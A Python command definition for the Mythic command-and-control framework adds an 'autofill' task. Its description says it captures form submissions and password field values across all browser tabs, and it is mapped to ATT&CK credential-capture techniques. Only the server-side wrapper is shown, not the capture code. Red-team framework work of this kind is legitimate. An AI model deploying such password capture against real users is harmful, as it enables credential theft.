from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments,
    MythicTask, PTTaskMessageAllData,
    PTTaskProcessResponseMessageResponse, CommandAttributes,
)


class AutofillArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class AutofillCommand(CommandBase):
    cmd            = "autofill"
    needs_admin    = False
    help_cmd       = "autofill"
    description    = (
        "Start capturing form submissions and password field values on all tabs. "
        "Captures both traditional form submits and JS-based login flows (password "
        "blur events). Stop with disable_autofill."
    )
    version        = 1
    author         = "@asaurusrex"
    argument_class = AutofillArguments
    parameters     = []
    attackmapping  = ["T1056.001", "T1539"]
    attributes     = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = ""
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
